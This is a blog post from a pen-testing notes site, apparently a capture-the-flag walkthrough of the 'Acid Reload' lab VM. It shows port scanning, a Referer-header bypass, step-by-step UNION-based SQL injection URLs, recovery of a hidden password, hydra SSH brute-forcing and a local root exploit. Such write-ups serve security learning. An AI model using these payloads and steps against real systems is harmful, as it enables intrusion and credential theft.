@@ -1,0 +1,384 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>acid_reload  | Bob1Bob2</title>
+
+<meta name="author" content="Bob1Bob2"> 
+
+<meta name="description" content="Tools: netdiscover
+Nmap
+Wfuzz
+DirBuster
+Burp Vulnerabilities: Use netdiscover to detect target IP address netdiscover -i eth0 -r 192.168.41.0/24 192. &hellip;"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="Bob1Bob2" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">Bob1Bob2</a></h1>
+<h4>Pen Test Notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:wg135.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">Acid_reload</h2>
+	<div class="entry-content"><h2>Tools:</h2>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>DirBuster</li>
+<li>Burp</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.170is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.171 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 22 and 33447 are opening.</p>
+
+<p>Port 33447 is filter, I run nmap again</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.171 -p 33447</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now I know it is running http service.</p>
+
+<p>use nikto to scan:</p>
+
+<p><code>nikto -h 192.168.41.171:33447</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a hidden path &lsquo;/bin&rsquo;</p>
+
+<p>check the page <code>192.168.41.171:33447/bin</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use DirBuster to scan</p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use Burpsuit to check when I try to get <code>/bin/dashboard.php</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>it is redirected to <code>/bin/includes/validation.php</code>. I can use referer bypass</p>
+
+<p>change http request to <code>GET /bin/dashboard.php HTTP/1.1</code> and referer to <code>Referer: http://192.168.41.171:33447/bin/includes/validation.php</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>forward the traffic</p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Bypass successfully.</p>
+
+<p>check the source code</p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got an link <code>l33t_haxor.php</code></p>
+
+<p>check the page code
+<img src="/images/blog/vulhub/acid_reload/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find <code>l33t_haxor.php?id=</code> looks like sqli</p>
+
+<p>Let&rsquo;s verify</p>
+
+<p>insert</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1'</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>easy sqli</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1' and true--+</code> no output, so, it is bracket enclosed single quote.</p>
+
+<p>now lets check how many columns we need by inserting null</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null)from(information_schema.columns)WHERE'1'='1
+</span><span class='line'>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),(null)from(information_schema.columns)WHERE'1'='1
+</span><span class='line'>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),(null),(null)from(information_schema.columns)WHERE'1'='1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>when there are two &lsquo;null&rsquo;, no error come back, so the column number is 2.</p>
+
+<p>next check which column holds string value.</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select('test'),(null)from(information_schema.columns)WHERE'1'='1</code></p>
+
+<p>no response</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),('test')from(information_schema.columns)WHERE'1'='1</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now we know column holds string value</p>
+
+<p>now get the version</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(NULL),(@@VERSION)from(information_schema.columns)WHERE'1'='1</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get user,</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(NULL),(user())from(information_schema.columns)WHERE'1'='1</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get table name</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),GROUP_CONCAT(DISTINCT(table_schema))from(information_schema.tables)WHERE'a'='a</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got four databases information_schema,mysql,performance_schema,secure_login</p>
+
+<p>get table name</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=-1')union(select(null),GROUP_CONCAT(DISTINCT(table_name))from(information_schema.columns)WHERE(table_schema)=database()and'test'like'test</code></p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>wget http://192.168.41.171:33447/UB3R/strcpy.exe</code></p>
+
+<p>check the file</p>
+
+<p><code>file strcpy.exe</code></p>
+
+<p><code>strcpy.exe: PDF document, version 1.5</code>. a pdf file in it.</p>
+
+<p>use foremost to recover</p>
+
+<p><code>foremost strcpy.exe</code></p>
+
+<p>in folder <code>output</code>,get a folder called rar and there is a rar file, unzip it , get a file called <code>lol.jpg</code></p>
+
+<p>try to use foremost on this file, get another rar, unzip it get a file called <code>Avinash.contact</code></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span class='line'><span class="nt">&lt;c:contact</span> <span class="na">c:Version=</span><span class="s">&quot;1&quot;</span> <span class="na">xmlns:c=</span><span class="s">&quot;http://schemas.microsoft.com/Contact&quot;</span> <span class="na">xmlns:xsi=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="na">xmlns:MSP2P=</span><span class="s">&quot;http://schemas.microsoft.com/Contact/Extended/MSP2P&quot;</span> <span class="na">xmlns:MSWABMAPI=</span><span class="s">&quot;http://schemas.microsoft.com/Contact/Extended/MSWABMAPI&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;c:CreationDate&gt;</span>2015-08-23T11:39:18Z<span class="nt">&lt;/c:CreationDate&gt;&lt;c:Extended&gt;&lt;MSWABMAPI:PropTag0x3A58101F</span> <span class="na">c:ContentType=</span><span class="s">&quot;binary/x-ms-wab-mapi&quot;</span> <span class="na">c:type=</span><span class="s">&quot;binary&quot;</span><span class="nt">&gt;</span>AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=<span class="nt">&lt;/MSWABMAPI:PropTag0x3A58101F&gt;&lt;/c:Extended&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;c:ContactIDCollection&gt;&lt;c:ContactID</span> <span class="na">c:ElementID=</span><span class="s">&quot;599ef753-f77f-4224-8700-e551bdc2bb1e&quot;</span><span class="nt">&gt;&lt;c:Value&gt;</span>0bcf610e-a7be-4f26-9042-d6b3c22c9863<span class="nt">&lt;/c:Value&gt;&lt;/c:ContactID&gt;&lt;/c:ContactIDCollection&gt;&lt;c:EmailAddressCollection&gt;&lt;c:EmailAddress</span> <span class="na">c:ElementID=</span><span class="s">&quot;0745ffd4-ef0a-4c4f-b1b6-0ea38c65254e&quot;</span><span class="nt">&gt;&lt;c:Type&gt;</span>SMTP<span class="nt">&lt;/c:Type&gt;&lt;c:Address&gt;</span>acid.exploit@gmail.com<span class="nt">&lt;/c:Address&gt;&lt;c:LabelCollection&gt;&lt;c:Label&gt;</span>Preferred<span class="nt">&lt;/c:Label&gt;&lt;/c:LabelCollection&gt;&lt;/c:EmailAddress&gt;&lt;c:EmailAddress</span> <span class="na">c:ElementID=</span><span class="s">&quot;594eec25-47bd-4290-bd96-a17448f7596a&quot;</span> <span class="na">xsi:nil=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;&lt;/c:EmailAddressCollection&gt;&lt;c:NameCollection&gt;&lt;c:Name</span> <span class="na">c:ElementID=</span><span class="s">&quot;318f9ce5-7a08-4ea0-8b6a-2ce3e9829ff2&quot;</span><span class="nt">&gt;&lt;c:FormattedName&gt;</span>Avinash<span class="nt">&lt;/c:FormattedName&gt;&lt;c:GivenName&gt;</span>Avinash<span class="nt">&lt;/c:GivenName&gt;&lt;/c:Name&gt;&lt;/c:NameCollection&gt;&lt;c:PersonCollection&gt;&lt;c:Person</span> <span class="na">c:ElementID=</span><span class="s">&quot;865f9eda-796e-451a-92b1-bf8ee2172134&quot;</span><span class="nt">&gt;&lt;c:FormattedName&gt;</span>Makke<span class="nt">&lt;/c:FormattedName&gt;&lt;c:LabelCollection&gt;&lt;c:Label&gt;</span>wab:Spouse<span class="nt">&lt;/c:Label&gt;&lt;/c:LabelCollection&gt;&lt;/c:Person&gt;&lt;/c:PersonCollection&gt;&lt;c:PhotoCollection&gt;&lt;c:Photo</span> <span class="na">c:ElementID=</span><span class="s">&quot;2fb5b981-cec1-45d0-ae61-7c340cfb3d72&quot;</span><span class="nt">&gt;&lt;c:LabelCollection&gt;&lt;c:Label&gt;</span>UserTile<span class="nt">&lt;/c:Label&gt;&lt;/c:LabelCollection&gt;&lt;/c:Photo&gt;&lt;/c:PhotoCollection&gt;&lt;/c:contact&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>find a base64 encoded <code>AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=</code>, its NooB@123</p>
+
+<p>create a dict file</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='xml'><span class='line'>Avinash
+</span><span class='line'>avinash
+</span><span class='line'>Makke
+</span><span class='line'>makke
+</span><span class='line'>acid
+</span><span class='line'>acid.exploit
+</span><span class='line'>acid.exploit@gmail.com
+</span><span class='line'>NooB@123
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>use hydra to crack</p>
+
+<p><code>hydra -L dict.txt -P dict.txt  192.168.41.171 ssh -s 22</code></p>
+
+<p>get login: makke   password: NooB@123</p>
+
+<p>find <code>.bash_history</code> file</p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find an interesting file <code>overlayfs</code></p>
+
+<p><code>locate overlayfs</code></p>
+
+<p>in <code>/bin</code></p>
+
+<p><code>ls -alh overlayfs</code></p>
+
+<p><code>-rwxr-xr-x 1 root root 12K Aug 24  2015 overlayfs</code></p>
+
+<p>which is overlayfs local root exploit file</p>
+
+<p>run it
+get the root</p>
+
+<p><img src="/images/blog/vulhub/acid_reload/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-09-11T08:58:02-05:00" pubdate data-updated="true">2016-09-11 08:58:02 -0500</time></div>
+	
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2017
+
+    Bob1Bob2
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
